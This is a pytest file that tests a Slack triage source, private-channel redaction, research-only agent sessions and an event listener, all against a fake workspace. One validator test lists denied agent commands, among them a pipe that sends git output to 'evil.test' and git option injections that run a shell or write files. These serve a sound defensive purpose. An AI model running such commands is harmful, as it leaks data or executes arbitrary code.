"""Slack source and its sorter path, on a synthetic workspace (no network, no real messages)."""
import json

import pytest

from hermes_auto import triage
from hermes_auto.bridge import read_only_command
from hermes_auto.cli import fast_sources, run_triage
from hermes_auto.config import defaults
from hermes_auto.hermes import Hermes, deny_mode
from hermes_auto.runner import prompt_for
from hermes_auto.store import Store
from hermes_auto_slack import Slack, Source, parse_hits

from test_triage import Fake

ME = "UME"
NOW = 1_800_000_000.0


@pytest.fixture
def store(tmp_path):
    result = Store(tmp_path, initialize=True)
    yield result
    result.close()


@pytest.fixture
def config():
    return {**defaults(), "language": "Polish",
            "sources": {"slack": {"enabled": True}},
            "triage": {"enabled": True, "brief_times": ["07:45", "16:30"]}}


def hit(channel, ts, thread=None):
    link = f"https://acme.slack.test/archives/{channel}/p{ts.replace('.', '')}"
    if thread:
        link += f"?thread_ts={thread}&cid={channel}"
    return (f"Channel: DM (ID: {channel})\nFrom: Someone\nTime: x\nMessage_ts: {ts}\n"
            f"Permalink: [link]({link})\nText: hidden\n")


class FakeSlack:
    """Workspace stand-in: channels with messages and threads; search over them like the MCP server."""

    def __init__(self):
        self.channels = {}
        self.threads = {}
        self.calls = []

    def channel(self, cid, **info):
        self.channels[cid] = {"id": cid, "messages": [], **info}

    def post(self, cid, user, ts, text, thread=None, **extra):
        message = {"ts": ts, "user": user, "text": text, **extra}
        if thread:
            message["thread_ts"] = thread
            self.threads.setdefault((cid, thread), []).append(message)
            parent = next(m for m in self.channels[cid]["messages"] if m["ts"] == thread)
            parent["reply_count"] = parent.get("reply_count", 0) + 1
            parent["latest_reply"] = ts
            parent.setdefault("reply_users", [])
            if user not in parent["reply_users"]:
                parent["reply_users"].append(user)
        else:
            self.channels[cid]["messages"].append(message)
        return message

    def api(self, method, **params):
        self.calls.append(method)
        if method == "auth.test":
            return {"ok": True, "user_id": ME, "team_id": "TACME", "url": "https://acme.slack.test/"}
        if method == "users.info":
            return {"ok": True, "user": {"profile": {"real_name": {"UCHRIS": "Chris", "UOZ": "Oz"}.get(
                params["user"], params["user"])}}}
        if method == "conversations.info":
            info = {k: v for k, v in self.channels[params["channel"]].items() if k != "messages"}
            return {"ok": True, "channel": info}
        if method == "conversations.history":
            oldest = float(params["oldest"])
            messages = [m for m in self.channels[params["channel"]]["messages"] if float(m["ts"]) > oldest]
            return {"ok": True, "messages": sorted(messages, key=lambda m: -float(m["ts"]))}
        if method == "conversations.replies":
            parent = next(m for m in self.channels[params["channel"]]["messages"] if m["ts"] == params["ts"])
            return {"ok": True, "messages": [parent, *self.threads.get((params["channel"], params["ts"]), [])]}
        raise AssertionError(method)

    def mcp_search(self, arguments):
        after = float(arguments["after"])
        types = arguments["channel_types"].split(",")
        filters = arguments["filters"]
        text = ""
        for cid, info in self.channels.items():
            kind = "im" if info.get("is_im") else "mpim" if info.get("is_mpim") else \
                "private_channel" if info.get("is_private") else "public_channel"
            if kind not in types:
                continue
            everything = [(m, None) for m in info["messages"]]
            for (tcid, thread), replies in self.threads.items():
                if tcid == cid:
                    everything += [(m, thread) for m in replies]
            for message, thread in everything:
                if float(message["ts"]) < after:
                    continue
                if filters.startswith(f"from:<@{ME}>") and message["user"] != ME:
                    continue
                if filters.startswith(f"<@{ME}>") and f"<@{ME}>" not in message["text"]:
                    continue
                text += hit(cid, message["ts"], thread)
        return json.dumps({"results": text, "pagination_info": "End of results"})


def slack_with(fake, now):
    return Slack({**Source.defaults(), "token_file": "unused"}, http=fake, now=lambda: now)


def baseline(store, fake, now=NOW):
    _, key, cursor = slack_with(fake, now).inbox({}, store)
    store.set_meta(key, cursor)
    return key


def test_parse_hits_reads_channel_ts_and_thread():
    text = hit("D1", "1.000100") + hit("C2", "2.000200", thread="1.500000")
    assert parse_hits(json.dumps({"results": text})) == [("D1", "1.000100", None), ("C2", "2.000200", "1.500000")]


def test_dm_burst_waits_for_quiet_then_one_candidate(store):
    fake = FakeSlack()
    fake.channel("D1", is_im=True, user="UCHRIS", last_read="0")
    key = baseline(store, fake)
    fake.post("D1", "UCHRIS", f"{NOW + 10:.6f}", "hej")
    fake.post("D1", "UCHRIS", f"{NOW + 20:.6f}", "mozesz zerknac na PR?")
    candidates, _, cursor = slack_with(fake, NOW + 60).inbox({}, store)
    assert candidates == []  # still typing: under quiet_seconds since the last message
    assert cursor["since"] < NOW + 10
    store.set_meta(key, cursor)
    candidates, _, cursor = slack_with(fake, NOW + 200).inbox({}, store)
    assert len(candidates) == 1
    item = candidates[0]
    assert item["kind"] == "slack" and item["why"] == "dm" and item["thread_id"] == "D1"
    assert item["subject"] == "Slack: Chris · DM" and not item["read"]
    assert "NOWE" in item["body"] and "mozesz zerknac" in item["body"]
    store.set_meta(key, cursor)
    # Handed over once: the same messages never come back.
    assert slack_with(fake, NOW + 400).inbox({}, store)[0] == []


def test_baseline_ignores_old_messages_and_bots_and_own(store):
    fake = FakeSlack()
    fake.channel("D1", is_im=True, user="UCHRIS", last_read="0")
    fake.post("D1", "UCHRIS", f"{NOW - 100:.6f}", "stara wiadomosc")
    baseline(store, fake)
    fake.post("D1", ME, f"{NOW + 10:.6f}", "moja")
    fake.post("D1", "UBOT", f"{NOW + 11:.6f}", "bot", bot_id="B1")
    fake.post("D1", "UCHRIS", f"{NOW + 12:.6f}", "edit", subtype="message_changed")
    candidates, _, cursor = slack_with(fake, NOW + 500).inbox({}, store)
    assert candidates == []


def test_read_or_answered_in_slack_marks_read(store):
    fake = FakeSlack()
    fake.channel("D1", is_im=True, user="UCHRIS", last_read="0")
    fake.channel("D2", is_im=True, user="UOZ", last_read="0")
    key = baseline(store, fake)
    fake.post("D1", "UCHRIS", f"{NOW + 10:.6f}", "pytanie")
    fake.channels["D1"]["last_read"] = f"{NOW + 10:.6f}"
    fake.post("D2", "UOZ", f"{NOW + 10:.6f}", "pytanie")
    fake.post("D2", ME, f"{NOW + 30:.6f}", "juz odpisalem")
    candidates, _, _ = slack_with(fake, NOW + 300).inbox({}, store)
    assert {c["thread_id"]: c["read"] for c in candidates} == {"D1": True, "D2": True}
    assert key


def test_channel_mention_and_followed_thread(store):
    fake = FakeSlack()
    fake.channel("C1", name="frontend")
    fake.post("C1", ME, f"{NOW - 3600:.6f}", "moj watek", subscribed=True)
    fake.post("C1", "UOZ", f"{NOW - 1800:.6f}", "ogolna rozmowa bez wzmianki")
    key = baseline(store, fake)
    fake.post("C1", "UOZ", f"{NOW + 5:.6f}", f"<@{ME}> mozesz spojrzec?")
    fake.post("C1", "UCHRIS", f"{NOW + 6:.6f}", "kolejny post bez wzmianki")
    fake.post("C1", "UCHRIS", f"{NOW + 7:.6f}", "odpowiedz w watku", thread=f"{NOW - 3600:.6f}")
    candidates, _, _ = slack_with(fake, NOW + 300).inbox({}, store)
    by_why = {c["why"]: c for c in candidates}
    assert set(by_why) == {"mention", "thread"}
    assert by_why["mention"]["place"] == "#frontend"
    assert "mozesz spojrzec" in by_why["mention"]["body"] and "NOWE [" in by_why["mention"]["body"]
    assert "kolejny post" not in [line for line in by_why["mention"]["body"].splitlines() if "NOWE" in line][0]
    assert by_why["thread"]["place"] == "#frontend · wątek"
    assert "?thread_ts=" in by_why["thread"]["url"] and key


def test_private_channel_passes_link_only(store):
    fake = FakeSlack()
    fake.channel("G1", name="tajny", is_private=True)
    key = baseline(store, fake)
    fake.post("G1", "UOZ", f"{NOW + 5:.6f}", f"<@{ME}> sekretna tresc")
    candidates, _, _ = slack_with(fake, NOW + 300).inbox({}, store)
    assert len(candidates) == 1 and candidates[0]["redacted"]
    assert "sekretna" not in json.dumps(candidates[0], ensure_ascii=False)
    prompt = triage.slack_session_prompt(candidates[0], "", {"language": "Polish"})
    assert "nie przytaczaj" in prompt and key


def slack_item(item_id="D1:@1.0", thread="D1", read=False, **extra):
    return {"kind": "slack", "id": item_id, "thread_id": thread, "account": "TACME", "read": read,
            "from": "Chris", "to": "Łukasz", "subject": "Slack: Chris · DM", "date": "2026-10-25 10:00",
            "why": "dm", "channel": "D1", "thread_ts": "", "ts": "1.0", "place": "DM", "private": False,
            "redacted": False, "dm": True, "snippet": "x", "body": "NOWE [..] Chris: mozesz zerknac na PR?",
            "url": "https://acme.slack.test/archives/D1/p10", "sent": [], **extra}


def test_sorter_opens_research_session_that_never_sends(store, config):
    fake = Fake(replies=[[{"i": 0, "decision": "session", "reason": "prosi o review", "summary": "Chris prosi"}]])
    report = triage.triage_mail(store, config, fake, "slack", "TACME", [slack_item()], "k", {"since": 1})
    assert [decision for decision, _, _ in report] == ["session"]
    system, user = fake.prompts[0]
    assert "Slacka" in system and user[0]["where"] == "DM"
    job = store.rows()[0]
    assert job["source"] == "slack" and deny_mode(job) == "research"
    prompt = prompt_for(job, config)
    assert "NIGDY sam nie odpowiadaj" in prompt and "research" in prompt and "SLACK-" in prompt
    row = store.db.execute("SELECT kind FROM triage_items").fetchone()
    assert row["kind"] == "slack"
    # The next burst in the same DM goes to a new "↩" session with the old one's context.
    store.update(job["id"], status="ready")
    fake2 = Fake(sessions={job["session_id"]: {}})
    triage.triage_mail(store, config, fake2, "slack", "TACME", [slack_item("D1:@2.0")], "k", {"since": 2})
    assert fake2.prompts == []  # routed, not classified
    triage.process_followups(store, config, fake2)
    newest = store.rows()[-1]
    assert newest["title"].startswith("↩ ") and deny_mode(newest) == "research"
    assert "ciąg dalszy rozmowy ze Slacka" in prompt_for(newest, config)


def test_read_in_slack_opens_nothing(store, config):
    fake = Fake(replies=[])
    report = triage.triage_mail(store, config, fake, "slack", "TACME", [slack_item(read=True)], "k", {"since": 1})
    assert [decision for decision, _, _ in report] == ["read"] and store.rows() == []


def test_slack_brief_section(store, config):
    fake = Fake(replies=[[{"i": 0, "decision": "brief", "reason": "info", "summary": "Chris dał znać o release"}]])
    triage.triage_mail(store, config, fake, "slack", "TACME", [slack_item()], "k", {"since": 1})
    rows = [dict(row) for row in store.db.execute("SELECT * FROM triage_items")]
    text = triage.render_brief(rows, config)
    assert "## Slack (1)" in text and "Chris dał znać" in text and "## Poczta" not in text


def test_slack_items_skip_the_waiting_check(store, config, monkeypatch):
    seen = {}

    class Adapter:
        def inbox(self, config, store, limit=40, since_ms=None):
            return [slack_item()], "k", {"since": 1}

    monkeypatch.setattr(triage, "check_waiting", lambda s, c, h, a, mails: seen.setdefault("mails", mails))
    fake = Fake(replies=[[{"i": 0, "decision": "skip", "reason": "", "summary": ""}]])
    config["sources"]["todoist"] = {"enabled": False}
    errors, _ = run_triage(config, store, lambda: fake, {"slack": Adapter}, only=["slack"])
    assert errors == [] and seen == {}


def test_fast_sources_follow_their_own_interval(store, config):
    config["sources"]["slack"]["poll_seconds"] = 120
    config["sources"]["gmail"] = {"enabled": True}
    assert fast_sources(config, store, now=1000) == ["slack"]
    store.set_meta("last_poll:slack", 950)
    assert fast_sources(config, store, now=1000) == []


def test_slack_runs_get_the_agent_budget(tmp_path, config):
    config["hermes_python"] = "/usr/bin/true"
    hermes = Hermes.__new__(Hermes)
    hermes.config = config
    assert hermes.budget({"source": "slack", "mode": "draft", "payload": json.dumps({"deny_tools": "slack"})}) \
        == config["agent_run_budget_seconds"]
    assert hermes.budget({"source": "gmail", "mode": "draft", "payload": json.dumps({"deny_tools": True})}) \
        == config["run_budget_seconds"]


SLACK_MCP = "python3 /Users/x/.hermes/skills/tap-in/tapin-slack/scripts/slack_mcp.py"


@pytest.mark.parametrize("command,allowed", [
    (f"{SLACK_MCP} call slack_read_thread '{{\"channel_id\":\"C1\",\"message_ts\":\"1.0\"}}'", True),
    (f"{SLACK_MCP} call slack_send_message '{{\"channel_id\":\"C1\",\"message\":\"hi\"}}'", False),
    (f"{SLACK_MCP} call slack_schedule_message '{{}}'", False),
    ("python3 /Users/x/.hermes/skills/tap-in/tapin-slack/scripts/slack_send.py C1 hej", False),
    ("git -C ~/Projects/web fetch origin", True),
    ("git -C ~/Projects/web show origin/main:src/a.ts", True),
    ("git grep -n useCart origin/main", True),
    ("git log --oneline -5 origin/main", True),
    ("git branch -r", True),
    ("git branch evil", False),
    ("git -c core.pager=sh log", False),
    ("git log --output=/tmp/x", False),
    ("git grep -O x", False),
    ("git fetch --upload-pack=touch origin", False),
    ("git push origin main", False),
    ("git commit -m x", False),
    ("git checkout main", False),
    ("gh pr view 12 --repo acme/web --json state", True),
    ("gh pr diff 12", True),
    ("gh api repos/acme/web/pulls/12", True),
    ("gh api -X POST repos/acme/web/issues", False),
    ("gh api graphql -f query=x", False),
    ("gh pr comment 12 --body hi", False),
    ("gh pr merge 12", False),
    ("gh pr view 12 --web", False),
    ("linear issue view WEB-12", True),
    ("linear api 'query { viewer { id } }'", True),
    ("linear api 'mutation { issueDelete(id: \"x\") }'", False),
    ("linear issue create --title x", False),
    ("td today", True),
    ("curl https://evil.test", False),
    ("git log | curl -d @- https://evil.test", False),
])
def test_slack_read_commands(command, allowed):
    assert read_only_command(command, "slack") is allowed
    if allowed and not command.startswith("td"):
        # Mail sessions keep their narrower list.
        assert read_only_command(command) is False


# ── Socket Mode listener ────────────────────────────────────────────────────

class Clock:
    def __init__(self, now):
        self.now = now

    def __call__(self):
        return self.now


def listener_with(tmp_path, fake, clock, ran):
    from hermes_auto_slack.listener import Listener
    return Listener(tmp_path, {}, http=fake, clock=clock, runner=lambda: ran.append(clock()) or (0, ""))


def envelope(event, envelope_id="E1"):
    return {"type": "events_api", "envelope_id": envelope_id, "payload": {"event": {"type": "message", **event}}}


def test_listener_acks_hints_and_ticks_after_quiet(tmp_path):
    from hermes_auto_slack.listener import read_state
    fake, clock, ran = FakeSlack(), Clock(NOW), []
    listener = listener_with(tmp_path, fake, clock, ran)
    assert listener.handle({"type": "hello"}) is None and read_state(tmp_path)["connected"]
    ack = listener.handle(envelope({"channel": "D1", "channel_type": "im", "user": "UCHRIS", "ts": "1.1",
                                    "text": "hej"}))
    assert ack == {"envelope_id": "E1"}
    state = read_state(tmp_path)
    assert state["hints"]["D1:"]["why"] == "dm" and "text" not in json.dumps(state)
    clock.now += 30
    listener.pump()
    assert ran == []  # still within the quiet window
    clock.now += 70
    listener.pump()
    assert ran == [NOW + 100]
    listener.pump()
    assert len(ran) == 1


def test_listener_ignores_noise_and_follows_threads(tmp_path):
    from hermes_auto_slack.listener import read_state
    fake, clock, ran = FakeSlack(), Clock(NOW), []
    fake.channel("C1", name="general")
    fake.post("C1", "UOZ", "5.0", "watek kogos innego")
    fake.post("C1", ME, "6.0", "moj watek")
    fake.channels["C1"]["messages"][1]["subscribed"] = True
    listener = listener_with(tmp_path, fake, clock, ran)
    noise = [{"channel": "C1", "channel_type": "channel", "user": "UOZ", "ts": "7.0", "text": "bez wzmianki"},
             {"channel": "C1", "channel_type": "channel", "user": "UOZ", "ts": "7.1", "text": "x", "bot_id": "B"},
             {"channel": "D1", "channel_type": "im", "user": ME, "ts": "7.2", "text": "moja"},
             {"channel": "C1", "channel_type": "channel", "user": "UOZ", "ts": "7.3", "text": "x",
              "thread_ts": "5.0"},
             {"channel": "D1", "channel_type": "im", "user": "UCHRIS", "ts": "7.4", "text": "x",
              "subtype": "message_changed"}]
    for event in noise:
        listener.handle(envelope(event))
    assert read_state(tmp_path).get("hints") is None
    listener.handle(envelope({"channel": "C1", "channel_type": "channel", "user": "UOZ", "ts": "8.0",
                              "text": "odp", "thread_ts": "6.0"}))
    listener.handle(envelope({"channel": "C2", "channel_type": "channel", "user": "UOZ", "ts": "8.1",
                              "text": f"<@{ME}> hej"}))
    hints = read_state(tmp_path)["hints"]
    assert hints["C1:6.0"]["why"] == "thread" and hints["C2:"]["why"] == "mention"


def test_due_follows_listener_nudges_and_relaxes_polling(tmp_path):
    from hermes_auto_slack.listener import write_state
    store = Store(tmp_path, initialize=True)
    try:
        source = Source()
        settings = {"enabled": True}
        assert source.due(settings, store, NOW - 130, NOW)  # no listener: 120 s polling
        write_state(tmp_path, {"connected": True, "heartbeat": NOW - 10})
        assert source.due(settings, store, NOW - 130, NOW)  # connected, but no event seen yet: keep polling
        write_state(tmp_path, {"connected": True, "heartbeat": NOW - 10, "last_event_at": NOW - 60})
        assert not source.due(settings, store, NOW - 130, NOW)  # live listener: 900 s polling
        write_state(tmp_path, {"connected": True, "heartbeat": NOW - 10, "last_event_at": NOW - 60,
                               "nudge_at": NOW - 100})
        assert source.due(settings, store, NOW - 130, NOW)
        assert not source.due(settings, store, NOW - 50, NOW)  # already checked after the nudge
    finally:
        store.close()


def test_listener_hint_finds_conversation_search_missed(tmp_path):
    from hermes_auto_slack.listener import write_state
    store = Store(tmp_path, initialize=True)
    try:
        fake = FakeSlack()
        fake.channel("D9", is_im=True, user="UCHRIS", last_read="0")
        key = baseline(store, fake)
        fake.post("D9", "UCHRIS", f"{NOW + 10:.6f}", "swieza wiadomosc")
        fake.mcp_search = lambda arguments: json.dumps({"results": "", "pagination_info": "End"})  # not indexed
        assert slack_with(fake, NOW + 300).inbox({}, store)[0] == []
        write_state(tmp_path, {"hints": {"D9:": {"channel": "D9", "thread_ts": None, "why": "dm",
                                                 "ts": f"{NOW + 10:.6f}", "seen": NOW + 10}}})
        candidates, _, _ = slack_with(fake, NOW + 300).inbox({}, store)
        assert [c["thread_id"] for c in candidates] == ["D9"] and key
    finally:
        store.close()


def test_slack_zero_interval_disables_own_polling(tmp_path):
    store = Store(tmp_path, initialize=True)
    try:
        assert not Source().due({"poll_seconds": 0, "listener_poll_seconds": 0}, store, NOW - 4000, NOW)
    finally:
        store.close()
